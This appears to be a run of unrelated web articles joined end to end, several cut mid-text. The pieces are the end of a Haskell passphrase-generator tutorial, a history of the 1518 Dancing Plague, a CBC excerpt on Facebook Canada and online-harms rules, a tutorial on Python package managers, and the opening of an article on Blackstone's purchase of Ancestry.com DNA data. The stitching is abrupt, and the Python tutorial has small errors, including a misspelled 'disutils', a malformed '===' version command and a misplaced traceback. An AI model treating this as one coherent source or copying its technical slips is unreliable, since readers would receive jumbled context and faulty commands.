    <span>index'</span> <span>=</span> <span>readMaybe</span> <span>index</span> <span>::</span> <span>Maybe</span> <span>Integer</span>
    <span>word'</span> <span>=</span> <span>L</span><span>.</span><span>headMaybe</span> <span>word</span>
</code></pre></div></div> <p><code>toTuple</code> takes a list of <code>String</code>s and returns a tuple of <code>(Integer, String)</code> where the <code>Integer</code> represents an index, and the <code>String</code> represents the corresponding word from the wordlist. We will call this function later when we map over each line in our wordlist.</p> <p>Since a line in our wordlist follows the format “<code>11111 abacus</code>”, we want to read the first string as an <code>Integer</code> and take the first word of the remaining words in our line. As <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Partial.html#v:read"><code>read</code></a> and <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-List-Partial.html#v:head"><code>head</code></a> can throw exceptions, we use the safe alternatives <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Prelude.html#v:readMaybe"><code>readMaybe</code></a> and <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-List.html#v:headMaybe"><code>L.headMaybe</code></a> instead. To unwrap our <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Prelude-Types.html#t:Maybe"><code>Maybe</code></a> values, we call <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Prelude.html#v:fromMaybe"><code>fromMaybe</code></a> and use <code>0</code> and <code>""</code> as the default values for the index and word, respectively. Lastly, to avoid non-exhaustive patterns, we pattern match on the empty list and return <code>(0, "")</code> for good measure.</p> <p>Now we can finally move on to writing the logic for generating passphrases which is handled by the <code>passphrase</code> function:</p> <div><div><pre><code><span>passphrase</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>[[</span><span>Integer</span><span>]]</span> <span>-&gt;</span> <span>String</span>
<span>passphrase</span> <span>wordlist</span> <span>dice</span> <span>=</span>
  <span>unwords</span> <span>$</span> <span>map</span> <span>(</span><span>flip</span> <span>(</span><span>Map</span><span>.</span><span>findWithDefault</span> <span>""</span><span>)</span> <span>wordMap</span><span>)</span> <span>indices</span>
    <span>where</span>
      <span>indices</span> <span>=</span> <span>map</span> <span>joinDigits</span> <span>dice</span>
      <span>wordMap</span> <span>=</span> <span>Map</span><span>.</span><span>fromList</span> <span>$</span> <span>map</span> <span>(</span><span>toTuple</span> <span>.</span> <span>words</span><span>)</span> <span>$</span> <span>lines</span> <span>wordlist</span>
</code></pre></div></div> <p>To generate a passphrase, we need to pass our wordlist as the first argument and then a list containing a list of our dice rolls as the second argument. The first argument will look like this:</p> <div><div><pre><code>11111 abacus
11112 abdomen
11113 abdominal
11114 abide
11115 abiding
11116 ability
11121 ablaze
11122 able
11123 abnormal
11124 abrasion
11125 abrasive
11126 abreast
11131 abridge
...
</code></pre></div></div> <p>While the second argument, i.e., our dice rolls, might look like this:</p> <div><div><pre><code><span>[</span> <span>[</span><span>5</span><span>,</span> <span>3</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>,</span> <span>6</span><span>]</span>
<span>,</span> <span>[</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>1</span><span>,</span> <span>6</span><span>,</span> <span>6</span><span>]</span>
<span>,</span> <span>[</span><span>2</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>1</span><span>,</span> <span>3</span><span>]</span>

</code></pre></div></div> <p>For all the lists in our list of dice rolls, we use our previously defined <code>joinDigits</code> function to join the numbers in the list into single digits. We then store these digits, or indices, in the <code>indices</code> variable, so we can use them later when we need to look up words in our wordlist.</p> <p>As shown above, the wordlist follows the format <code>INDEX WORD</code>, so we split our wordlist on line breaks using <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Prelude.html#v:lines"><code>lines</code></a> which gives us a list of <code>String</code>s containing elements such as <code>"11111 abacus"</code> and <code>"11112 abdomen"</code>. We want to further break these elements down so we will end up with a list of tuples. To do so, we map over all the lines in our wordlist and call <code>(toTuple . words)</code> on them. Now that we have a list of tuples, we can convert it to a <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Map.html#t:Map"><code>Map</code></a> using <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Map.html#v:fromList"><code>Map.fromList</code></a> so we can perform efficient lookups later.</p> <p>For all our indices, we want to find the corresponding word in our wordlist which we do with <code>map (flip (Map.findWithDefault "") wordMap) indices</code>. Since <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Map.html#v:findWithDefault"><code>Map.findWithDefault</code></a> expects the index of the map to be the second argument and the map to be the last, we use two useful techniques here to make our code less convoluted. First, we leverage currying by applying <code>""</code> as the first argument to <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Map.html#v:findWithDefault"><code>Map.findWithDefault</code></a>, and then we use <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Prelude.html#v:flip"><code>flip</code></a> to reverse the order of the last two arguments.</p> <p>By flipping the order, we can now do a simple map over our <code>indices</code> variable and perform a lookup in our <code>wordMap</code> in a slightly more elegant fashion. Once we have all our words, we can join them into a single <code>String</code> using <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-List.html#v:unwords"><code>unwords</code></a>.</p> <p>With the fundamental logic now defined, we only need to read our wordlist from a file, throw five dice six times, and pass these two values to our <code>passphrase</code> function. We do so by defining the entry point of our app in <a href="https://github.com/majjoha/passphrase/blob/main/app/Main.hs"><code>Main.hs</code></a> as such:</p> <div><div><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>wordlist</span> <span>&lt;-</span> <span>T</span><span>.</span><span>unpack</span> <span>&lt;$&gt;</span> <span>readFileUtf8</span> <span>"data/eff-large-wordlist.txt"</span>
  <span>dice</span> <span>&lt;-</span> <span>replicateM</span> <span>6</span> <span>$</span> <span>rollDice</span> <span>5</span> <span>1</span> <span>6</span>
  <span>runSimpleApp</span> <span>$</span> <span>do</span>
    <span>logInfo</span> <span>.</span> <span>display</span> <span>.</span> <span>T</span><span>.</span><span>pack</span> <span>$</span> <span>passphrase</span> <span>wordlist</span> <span>dice</span>
</code></pre></div></div> <p>This largely resembles the steps listed earlier. To retrieve our wordlist, we call <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO.html#v:readFileUtf8"><code>readFileUtf8</code></a> with the path to our wordlist, and then <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Text.html#v:unpack"><code>T.unpack</code></a> to convert the <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Text.html#t:Text"><code>Text</code></a> value into a <code>String</code>.</p> <p>Next, we roll our five dice six times by calling <code>replicateM 6 $ rollDice 5 1 6</code>, and pass our <code>wordlist</code> and <code>dice</code> to the <code>passphrase</code> function.</p> <p>After calling our <code>passphrase</code> function, we now have a passphrase that we need to output in our terminal. Following the conventional structure for how to build apps using <a href="https://github.com/commercialhaskell/rio"><code>rio</code></a>, we run our app as a <a href="https://hackage.haskell.org/package/rio-0.1.15.0/docs/RIO-Prelude-Simple.html#t:SimpleApp"><code>SimpleApp</code></a> which provides a convenient default configuration. We convert the result from our <code>passphrase</code> function into a <a href="https://hackage.haskell.org/package/rio-0.1.19.0/docs/RIO-Text.html#t:Text"><code>Text</code></a> value, then a <a href="https://hackage.haskell.org/package/rio-0.1.15.0/docs/RIO.html#t:Utf8Builder"><code>Utf8Builder</code></a>, and, lastly, print it in our terminal with <a href="https://hackage.haskell.org/package/rio-0.1.15.0/docs/RIO.html#v:logInfo"><code>logInfo</code></a>.</p> <p>With everything in place, we have now reached our goal and can finally build our project by running <code>stack build</code> and generate a passphrase:</p> <div><div><pre><code>% stack exec -- passphrase
polar geek nimble okay appealing trim
</code></pre></div></div> <p>In my experience, the Haskell community is great at sharing their knowledge on both Twitter and in various blog posts. With this blog post, I hope to contribute back to the community and help especially the people newer to the language who might want to move beyond contrived exercises and learn how to build smaller apps. If you are interested, you can find the project on GitHub <a href="https://github.com/majjoha/passphrase">here</a>, and if you have any feedback, I am all ears.</p> </section> </div></div>]]>

<p>Arguably one of the strangest events in European history, to this day the exact cause of the plague is still up for debate.</p>

<p>When one thinks of the great European plagues we imagine the horrors of the <a href="https://www.historytoday.com/ole-j-benedictow/black-death-greatest-catastrophe-ever">Black Death</a>, which rampaged its way across medieval Europe. High born or peasant, all were subject to the misery it brought to our towns and villages.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Dancing_plague_of_1518">Dancing Plague</a>, however, appears quite comical at first glance. Its victims displayed signs of delirium and their symptoms were a relentless need to dance and contort their bodies.</p>

<p>The event took place in the<a href="https://en.wikipedia.org/wiki/Alsace"> Alsace</a> region – which at the time was part of the<a href="https://www.britannica.com/place/Holy-Roman-Empire"> Holy Roman Empire</a> – and over 400 people are said to have fallen victim to this mania.</p><p>The first alleged case of the Dancing Plague arose when a Strasbourg native, Mrs Troffea, began to dance in the street. Within a matter of days, others in Strasbourg has joined Mrs Troffea and quickly the numbers began to swell.</p><p>Within a month there were scores of people dancing for up to six days at a time, resulting in death by exhaustion, heart attack or stroke.</p>



<p>As the situation deteriorated, many concerned nobles in the Alsace region sought the advice of physicians and the clergy. Many believed the mania currently being exhibited on their streets were being caused by astrological events or even witchcraft.</p>

<p>Physicians denied the notion of the supernatural and instead believed the cause of this epidemic to be a natural one. ‘Hot blood’ was the prognosis, and in an even stranger turn of events, the physicians actually advised that those suffering continue to dance so as to wear off the effects of the affliction.</p>

<p>Authorities even went so far as to draft in musicians to assist in the affair. The reality, however, is that those affected by this bizarre ‘disease’ were pushing their bodies to the limit of human endurance.</p>

<p>When one considers the strain that long-distance running, swimming or other forms of exercise have upon the body, then dancing near continuously for days on end without hydration or food is very dangerous.</p><h4><strong>Potential Causes</strong></h4>

<p>There are a number of theories that point toward the source of this outbreak in 1518, which was not the first time a dancing epidemic had occurred. In the late 14th century, a similar event took place in modern-day Belgium and Luxembourg.</p>

<p>One cause points toward ‘<a href="https://en.wikipedia.org/wiki/Ergot">ergot</a>‘, a psychotropic mould that grows on rye crops. This substance is known to cause delusions and spasms, however, it also cuts off blood supply to the extremities, making basic movement very difficult.</p>

<p>Another popular modern hypothesis is that the cause was simply mass-hysteria. The same general region had seen similar occurrences in the past, and on both occasions, the regions in question were blighted by famine, disease and social &amp; religious unrest.</p><p>This was a particularly tumultuous time in European history, and with social upheaval also comes uncertainty and fear.</p>

<p>People in the 16th century were very spiritual and we see on many occasions that superstition can lead to hysteria, unrest, and even violence. Historian John Waller hypothesises that whilst in a distressed psychological state, the people of Strasbourg may have entered a trance. Thereafter, the issue was exacerbated by the superstitious nature of their neighbours and peers.</p>

<p>There is no denying that the Dancing Plague spread very quickly, and almost appears to take the form of a contagious disease. Spreading quickly throughout the peasantry the hysteria brought turmoil to Strasbourg, and it is an event that still baffles many to this day.</p>

"So we think that public rules by Parliament would help clarify these things and obviously apply across the internet."</p>  <p>Chan said Facebook already removes content considered illegal in Canada such as hate speech, revenge porn, and content involving child exploitation or terrorism. It also applies other Canadian laws such as removing ads for things like baby walkers that Health Canada has prohibited for sale in Canada.</p>  <p>Chan said Facebook also goes further and removes content that isn't illegal in Canada such as posts involving nudity, bullying or harassment. While Chan said Facebook has a sophisticated system in place, he said it would welcome a move by Parliament to help draw the line between prohibited and allowable content.</p>  <p>"We would welcome further rules. We would welcome further guidance and we would ... welcome rules that apply to everyone equally."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5155004.1587157658!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/facebook-canada-public-policy-kevin-chan.jpg 300w,https://i.cbc.ca/1.5155004.1587157658!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/facebook-canada-public-policy-kevin-chan.jpg 460w,https://i.cbc.ca/1.5155004.1587157658!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/facebook-canada-public-policy-kevin-chan.jpg 620w,https://i.cbc.ca/1.5155004.1587157658!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/facebook-canada-public-policy-kevin-chan.jpg 780w,https://i.cbc.ca/1.5155004.1587157658!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/facebook-canada-public-policy-kevin-chan.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5155004.1587157658!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/facebook-canada-public-policy-kevin-chan.jpg"></p></div><figcaption>Facebook Canada's global director and head of public policy Kevin Chan says the tech giant would welcome clearer rules regarding what can - and can't - be posted online.<!-- --> <!-- -->(Chris Wattie/Reuters)</figcaption></figure></span></p>  <p>Chan said Facebook would also like to see stronger privacy legislation and has called for changes in tax provisions such as collecting and remitting sales tax to the government.</p>  <p>However, Chan said it would be a mistake for Canada to try to follow Australia's attempt to force tech giants to pay news media for their content shared on Facebook.&nbsp;</p>    <p>"Some of the ideas that we've seen discussed, such as the ones proposed in Australia where Facebook would be required to pay for links that are shared on our platform that we don't control, is going to be unworkable, we wouldn't be able to make that work because that's just not how things get shared onto Facebook."</p>  <h2>Legislation on tech giants expected</h2>  <p>Chan's comments come as he and Canadian Heritage Minister Steven Guilbeault are each scheduled to testify separately today before the House of Commons heritage committee on the relationship between Facebook and the government. The hearing was convened following a news report last fall suggesting that the tech giant's relationship with some Canadian government officials was too cozy.</p>  <p>In his latest mandate letter, Prime Minister Justin Trudeau charged Guilbeault with ensuring that the revenues of web giants are shared more fairly with creators and the media. Guilbeault is also tasked with making sure social media companies&nbsp;"take action on combating hate groups and online hate and harassment, ideologically motivated violent extremism and terrorist organizations."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5366690.1611961724!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/trudeau-cabinet-20191120.jpg 300w,https://i.cbc.ca/1.5366690.1611961724!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/trudeau-cabinet-20191120.jpg 460w,https://i.cbc.ca/1.5366690.1611961724!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/trudeau-cabinet-20191120.jpg 620w,https://i.cbc.ca/1.5366690.1611961724!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/trudeau-cabinet-20191120.jpg 780w,https://i.cbc.ca/1.5366690.1611961724!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/trudeau-cabinet-20191120.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5366690.1611961724!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/trudeau-cabinet-20191120.jpg"></p></div><figcaption>Canadian Heritage Minister Steven Guilbeault is set to testify today before the House of Commons heritage committee. <!-- --> <!-- -->(Adrian Wyld/The Canadian Press)</figcaption></figure></span></p>  <p>Camille Gagné-Raynault, press secretary to Guilbeault, said the government is planning to introduce two separate pieces of legislation related to tech giants. The first, which they plan to introduce this winter, will address "online harms."</p>  <p>"For the other one, we are currently exploring options for a made-in-Canada formula that would ultimately lead to a comprehensive, coherent and equitable digital framework for both Canadian news publishers and digital platforms."</p>  <h2>Social media platforms scrutinized&nbsp;</h2>  <p>Social media platforms like Facebook and Twitter have been in the spotlight in recent weeks after right-wing demonstrators stormed Washington's Capitol building. In the wake of the riot, Facebook and Twitter suspended former President Donald Trump's accounts.</p>  <p>However, as social media giants have exerted more control over what is posted on their sites, those whose content was removed have gravitated to other platforms like Parler, Gab, Telegram or Omega Canada.</p>    <p>It is not clear whether the Canadian government could impose Canadian laws on sites that are used by Canadians but which are not located in Canada.</p>  <p>Chan said Facebook has been steadily toughening up its community standards over the past two years, removing groups and individuals that advocate things like white supremacy. More recently, Facebook removed militarized social networks from its platform and QAnon conspiracy sites.</p>    <p>Chan said Facebook is working with Canadian experts like Barbara Perry, director of the Centre on Hate, Bias and Extremism at Ontario Tech University, to identify extremist content and block it. But as Facebook removes things like hate speech, those trying to disseminate it try to find ways to get around Facebook's systems.</p>  <p>"If we start removing certain people, certain presences on Facebook and Instagram, it is very possible that they evolve their tactics and try to work around our enforcement measures," said Chan. "This is an ongoing security matter for us and as they evolve, we will evolve."</p>  <p><em>Elizabeth Thompson can be reached at <a href="mailto:elizabeth.thompson@cbc.ca">elizabeth.thompson@cbc.ca</a>.</em></p></span></p></div></div>]]>

<h2 id="introduction-to-python-package-managers"><a href="#introduction-to-python-package-managers" aria-label="introduction to python package managers permalink"></a>Introduction to Python Package Managers</h2>
<p>Currently, the most popular package manager in Python is Pip, which was introduced after Python 2.7.9. Before Pip, the predominant tool for package management was <code>disutils</code> or its third-party extension, <code>easy_install</code>.</p>
<p>Let’s take a look at all of these one by one and start with explaining what a package is here. In Python, a package is defined as a module that contains other modules or packages. These are the packages you import in your Python code. However, these are not the packages that are being discussed here. </p>
<p>The packages being mentioned here are the Distribution Packages, which are versioned archive files that contain modules, packages and other files that are important for the distribution of a particular release. </p>
<p>These archive files are what the users and you download when you install a package using Pip or any of the other package managers. Creating distributions is how you allow users to use your Python projects. </p>
<p>In this tutorial, you’ll first learn about the tools that are available to create Python distributions. Then you’ll learn about the tools you can use to install these distributions. In short, you’ll learn everything about maintaining Python packages that you’ll come across while working as a Data Scientist. </p>
<p>To start off this tutorial, you will begin with installing Python on your system, then you will learn about Python Package Index and discover more about disutils and how you can use it to register and upload your packages. Next up, you will learn about Setuptools and Easy Install, which is a third-party application that uses Setuptools. </p>
<p>You will finally learn about Pip and finally, a little bit about Conda, which comes pre-installed with Anaconda. Conda is much more powerful than Pip since it supports environment and package management, allowing you to create and delete environments. You can learn about how to install Anaconda from here.</p>
<h2 id="check-for-python"><a href="#check-for-python" aria-label="check for python permalink"></a>Check for Python</h2>
<p>Before proceeding with package management. The first step is to check whether you have Python installed on your system. Checking this is easy but depends on how you have installed Python. </p>
<p>If you installed Anaconda on Windows, then search for <code>Anaconda Prompt</code> in the Windows search and open the command prompt. In there, just type: </p>

<p>If you had installed and configured everything correctly, you should get the version of Python installed as output: </p>

<p>Otherwise, if you’re running the command on a command prompt or terminal without installing Python then you’ll get something like: </p>
<div data-language="python"><pre><code>Traceback <span>(</span>most recent call last<span>)</span><span>:</span>
  File <span>"&lt;stdin&gt;"</span><span>,</span> line <span>1</span><span>,</span> <span>in</span> <span>&lt;</span>module<span>&gt;</span>
NameError<span>:</span> name <span>'python'</span> <span>is</span> <span>not</span> defined</code></pre></div>
<p>If you’re using an interactive notebook like Jupyter to use Python then you can use the same command with an exclamation mark at the start to check the version of Python installed on your system. </p>

<p>You’ll get the version of Python installed as an output, similar to how it ran on the anaconda prompt. The figure one shows the output in case of a Jupyter Notebook.</p>
<p><img src="https://nickmccullum.com/images/blog/history-python-package-managers/jupyter.png" alt="Testing Your Python version in a Jupyter Notebook"></p>
<p>Fig 1: Jupyter Notebook Output</p>
<h2 id="python-package-index-pypi"><a href="#python-package-index-pypi" aria-label="python package index pypi permalink"></a>Python Package Index (PyPi)</h2>
<p>The Python Package Index (PyPi) is basically a huge third-party repository for Python packages. It is also known as the Cheese Shop and holds packages in the form of archives called sdists (source distributions) or alternatively in the form of precompiled Wheels. </p>
<p>PyPi allows you to version your Python package distribution, allowing you to update the repository as much as you would like. Anytime you update the metadata, a new version is updated on the PyPi repository. </p>
<p>The end user can search for relevant packages via keywords or the metadata of the packages. Thus, the PyPi repository acts like an index, which stores more than 113,000 Python packages. </p>
<p>PyPi is the repository that Pip searches through when you try to install a package using Pip or easy_install. It is an efficient distribution channel that even a novice developer can use to share their Python projects.</p>
<h2 id="disutils"><a href="#disutils" aria-label="disutils permalink"></a>Disutils</h2>
<p>Disutils is the standard tool for packaging in Python, it was developed by the core team and is included in standard Python libraries. It has two main commands for packaging and uploading data to PyPi. </p>
<p>The <code>register</code> command is used for sending metadata to PyPi while the <code>upload</code> command is used for uploading the submitted distribution files. </p>
<p>This tutorial will not be getting into details of how to package your Python project and upload it on PyPi. If you want to learn about how you can upload your Python project using disutils, read the official guide from <a href="https://docs.python.org/3.3/distutils/packageindex.html">here</a>.</p>

<p>While disutils allows you to package your Python projects, it only offers very limited features. Disutils was built by the Python core team and only implements the core standards and the minimal necessary compilation. </p>
<p>For more advanced and useful features, there is setuptools, which offers extended compiler, package format and other support to effectively package Python projects. Since setuptools is a third party package, it does not come pre-installed with a Python library. </p>
<p>This tutorial will not discuss how to package Python projects with setuptools. To learn about using setuptools, you can follow this <a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#developer-s-guide">developers guide</a> to using setuptools. The guide mentions all the important commands and keywords you will need to know to start using setuptools. </p>
<h3 id="easy-install"><a href="#easy-install" aria-label="easy install permalink"></a>Easy Install</h3>
<p>Before there was Pip, there was easy install, which was also a package manager for Python. Easy install allows for automatic downloads, builds, installs and updates for Python packages. </p>
<p>Using easy install was quite similar to Pip, you had to provide the URL, filename or PyPi project name to get the designated Python package. After you have entered the appropriate package name, easy install will try to get the latest available version of Python package for you. </p>
<p>Easy install recognizes files with extensions of .zip, .tar.bz2, .tar.gz and a few others. It also supports the already built .egg and .win2.exe distributions that are built using disutils.</p>
<p>Let’s highlight some of the basic commands of easy install. You can install a Python package by using the following easy install command: </p>
<div data-language="python"><pre><code>easy_install package_name</code></pre></div>
<p>This is how you can install a Python package if you know its URL and package name: </p>
<div data-language="python"><pre><code>easy_install <span>-</span>f URL package_name</code></pre></div>
<p> Upgrading an installed package is pretty simple with easy install: </p>
<div data-language="python"><pre><code>easy_install <span>-</span><span>-</span>upgrade package_name</code></pre></div>
<p>If you want to install a specific version of the package, you can do so by including the version name: </p>
<div data-language="python"><pre><code>easy_install ‘package_name<span>==</span><span>1.3</span><span>.2</span>’</code></pre></div>
<p>You can revert back to a previous version of a package by entering the following command: </p>
<div data-language="python"><pre><code>easy_install package_name<span>==</span><span>=</span><span>1.2</span></code></pre></div>
<p>To uninstall a package, you use the following command to remove all references to that package: </p>
<div data-language="python"><pre><code>easy_install <span>-</span>m package_name</code></pre></div>
<p>After running the command, you can manually remove the .egg and any other associated files from your system. </p>
<p>To learn more about easy install and how you can easily manage your Python packages, head to the official documentation <a href="https://setuptools.readthedocs.io/en/latest/easy_install.html">here</a>.</p>
<h2 id="pip"><a href="#pip" aria-label="pip permalink"></a>Pip</h2>
<p>Pip installs packages or Pip as it is commonly known is the most well-known Python package manager. It enables for convenient installation and maintenance of Python packages found in the Python Package Index (PyPi). </p>
<p>Python versions later than 2.7.9 come with a pre-installed pip. It was built on setuptools as well and was released in 2008 as a direct replacement of easy installs. One notable feature of pip when it was released was that it did not install packages as eggs, rather installed them through requirement files, allowing users to conveniently replicate environments. You can read more about the difference between pip and easy tools <a href="https://packaging.python.org/discussions/pip-vs-easy-install/">here</a>.</p>
<p>Since pip was built to replace easy tools, most of the pip commands are very similar to easy installs. Let’s check some of the most common pip commands. </p>
<p>Here’s how you can install the latest version of a package using pip: </p>

<p>If you want to install a specific version of the package, you can do so by including the version name: </p>
<div data-language="python"><pre><code>pip install ‘package_name<span>==</span><span>1.3</span><span>.2</span>’</code></pre></div>
<p>You can easily upgrade a package using pip: </p>
<div data-language="python"><pre><code>pip install <span>-</span><span>-</span>upgrade package_name</code></pre></div>
<p>To uninstall a package:</p>
<div data-language="python"><pre><code>pip uninstall package_name</code></pre></div>
<p>A great feature of pip is that it supports the installation of packages by using a <code>requirements.txt</code> file. The text files include a list of packages and their version numbers required to run the project. </p>
<p>Here’s a sample <code>requirements.txt</code> file, which installs some machine learning related packages: </p>
<div data-language="python"><pre><code>tensorflow<span>==</span><span>1.7</span>

scipy

scikit<span>-</span>learn

opencv<span>-</span>python</code></pre></div>
<p>Here’s how you can run the requirements file to install all of these packages: </p>
<div data-language="python"><pre><code>pip install <span>-</span>r requirements<span>.</span>txt</code></pre></div>
<p>To learn more about requirements files, read <a href="https://pip.pypa.io/en/latest/user_guide/#requirements-files">this</a> official guide.</p>
<h3 id="conda"><a href="#conda" aria-label="conda permalink"></a>Conda</h3>
<p>Conda is included when you install Anaconda, which is a free and open source distribution of Python. Conda allows you to install packages and manage environments as well. It comes with a default environment <code>base</code>, which is activated whenever you use Python in Anaconda. </p>
<p>It is advised that you do not use the base environment and create your own to isolate your Python projects. This tutorial is just giving an honorary mention to Conda, as it is the leading Python package manager. There is a lot more to it and you can learn it from the official Conda <a href="https://conda.io/docs/user-guide/getting-started.html#managing-environments">tutorial</a>.</p>
<h2 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h2>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>We’re beginning to get a picture of the people who might have a goldmine in their genome.</p>
<p>The paradox of treating your own DNA as a commodity is that you’d actually be lucky if you’ve got a rare, poorly understood genetic disease, as those troublesome stretches of DNA may be the most valuable for medical research, explains Dennis Grishin, the cofounder of Nebula Genomics, a California company offering whole genome sequencing. You’d be luckier still if you have genetic patterns that would usually cause you to become ill with a disease like this, and yet appear completely healthy. That’s one variety of in-demand DNA: genomes belonging to people that Grishin calls “natural knockouts,” meaning genetic variations in the disease-associated genes in their genomes somehow save them from falling ill.</p>
<p>“There are people who have ‘broken genes’ and actually should be severely sick. But they are not sick for some reason, and we don’t really understand why,” Grishin says. “So there is some kind of compensatory mechanism going on that prevents people from getting sick.”</p>

<p>Sequencing the genomic data of these natural knockouts might help medical researchers understand diseases better, discover how we can avoid becoming ill, and define new drug targets. But it is far from the only way that genes could create<strong> </strong>enormous value, with scientific breakthroughs year-on-year exposing new functions of our genome and data scientists finding new ways to turn our essential code into valuable insights.</p>
<p>If you’ve never before considered how valuable an asset your DNA might be, you are far behind. Some of the biggest direct-to-consumer DNA sequencing companies are busy monetizing their large-scale genomics databases, with hopes to shape the burgeoning DNA economy and reap its rewards. And if you spit in a cup for one of these companies, your DNA might already be under the corporate control of some of the richest firms on Wall Street.</p>
<p>With their purchase of Ancestry.com late last year, the private equity firm Blackstone now owns the DNA data of 18 million people. And Blackstone is currently ramping up efforts to monetize the data amassed among the companies it owns. But experts say Wall Street firms’ interest in genomics poses new and unforeseen threats, and risks sowing distrust among DNA donors. Without trust, could we miss out on the genome’s real value?</p>
<h3>A bull market for DNA</h3>
<p>Since the global financial crisis of 2008, private equity firms—which buy up and reshape diverse private companies—have quietly overtaken traditional investment banks like Goldman Sachs as the “dominant players in the financial world,” according to the Financial Times. It’s been a rough tenure so far. While private equity mega-deal hits have made billions for investors, often the companies acquired pay the price, as with high-profile flops including <a href="https://www.economist.com/finance-and-economics/2011/02/03/the-magical-misery-tour" target="_blank" rel="noopener">mismanaged music group EMI</a> and bankrupt retailer <a href="https://www.theatlantic.com/magazine/archive/2018/07/toys-r-us-bankruptcy-private-equity/561758/" target="_blank" rel="noopener">Toys R Us</a>. The industry has become “the poster child for financial firms that suck value out of the economy,” said U.S. Senator Elizabeth Warren, while <a href="https://thehill.com/homenews/campaign/453706-warren-targets-wall-street-with-regulations-in-new-economic-plan" target="_blank" rel="noopener">introducing an act to Congress aimed at reining in private equity “vampires.</a>”</p>
<p>In December the biggest, most dominant private equity company of them all, the Blackstone Group, Inc., which boasts half a trillion dollars in assets under management, made a dramatic entry into the genomics space when it bought a controlling stake in Ancestry.com as part of the deal that valued the genealogy and gene testing company at $4.7 billion. And with that one stroke of the pen, the firm acquired the largest trove of DNA data assembled by any consumer gene tester. If your own DNA sequence is included in this collection, it exists on servers somewhere along with the genomes of 18 million people from at least 30 countries.</p>
<p><a href="https://www.blackstone.com/press-releases/article/blackstone-to-acquire-ancestry-leading-online-family-history-business-for-4-7-billion/" target="_blank" rel="noopener">Announcing the deal</a>, David Kestnbaum, a senior managing director at Blackstone said he foresees Ancestry growing by “investing behind further data, functionality, and product development.” At the same time, many privacy-concerned watchers had the same question: How does Blackstone aim to monetize Ancestry’s massive database, which includes users’ most sensitive genomic data and family histories?</p>
<p>Those lingering worries were ignited in the final days of 2020 by revelations buried in U.S. Securities and Exchange Commission (SEC) filings, and unearthed by Bloomberg, that showed Blackstone will begin to “<a href="https://www.bloomberg.com/news/articles/2020-12-15/blackstone-s-next-product-could-be-data-from-companies-it-buys" target="_blank" rel="noopener">package and sell data</a>” from the companies it acquires as a fresh revenue stream.&nbsp;</p>
<p>For any entrepreneur or investor in the genomics space who knows the industry needs investment to realize its dramatic potential, the question is vexed. Are deals that bring sensitive data under the control of private equity mega-funds a much-needed path to realizing the industry’s goals? Or do they threaten to derail the rapid progress that consumer gene science is making?</p>
<h3>If you buy it, they will come</h3>
<p>Founded in 1985 by former Lehman Brothers bankers Peter Peterson and Stephen Schwarzman, Blackstone is today seen by many as an unequivocal leader in the private equity space—not just for the colossal deals it makes but for the trends it sets. The company’s acquisition strategies become profitable pathways that smaller firms follow, like snapping up single-family homes after the subprime crash of 2008 <a href="https://www.nytimes.com/2020/03/04/magazine/wall-street-landlords.html" target="_blank" rel="noopener">to quickly become the world’s biggest landlord</a>. While its core business is still buying private companies using investor money and debt, Blackstone has found ever more diverse revenue streams, including buying commercial real estate and infrastructure, lending private credit, and managing hedge funds. As it has amassed $584 billion in investor assets, a figure exceeding the GDP of 90 percent of the countries in the world, Blackstone has come under increasing scrutiny both for its business practices and for CEO Schwarzman’s close ties to former U.S. President Donald J. Trump, remaining steadfast in recent weeks as perhaps his <a href="https://www.ft.com/content/0f13977f-fe5a-4db7-8996-b5496c49206b" target="_blank" rel="noopener">last-remaining supporter among the Wall Street elite</a>.</p>
